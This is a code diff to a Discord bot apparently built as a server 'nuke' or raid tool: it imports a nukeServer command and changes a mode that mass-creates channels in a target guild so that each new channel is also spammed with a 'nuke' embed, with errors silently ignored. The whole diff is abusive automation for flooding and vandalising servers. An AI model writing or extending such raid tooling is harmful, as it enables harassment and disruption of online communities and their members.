@@ -19,7 +19,7 @@ import {
   TextInputBuilder,
   TextInputStyle,
 } from 'discord.js';
-import { nukeServer } from './commands/nuke.js';
+import { nukeServer, buildNukeEmbed } from './commands/nuke.js';
 
 // ─── Owner whitelist ───────────────────────────────────────────────────────────
 const ALLOWED_IDS = new Set(
@@ -368,9 +368,14 @@ client.on(Events.InteractionCreate, async (interaction) => {
       if (mode === '1') {
         const [chanResult, roleResult] = await Promise.allSettled([
           (async () => {
-            const tasks = Array.from({ length: count }, () =>
-              targetGuild.channels.create({ name: channelName }).catch(() => {}),
-            );
+            const tasks = Array.from({ length: count }, async () => {
+              try {
+                const ch = await targetGuild.channels.create({ name: channelName });
+                if (ch && typeof ch.send === 'function') {
+                  await ch.send({ embeds: [buildNukeEmbed(channelName)] }).catch(() => {});
+                }
+              } catch { /* ignore */ }
+            });
             const results = await Promise.allSettled(tasks);
             const ok = results.filter((r) => r.status === 'fulfilled').length;
             return `📣 **Channels Created** — \`${ok}\` created`;
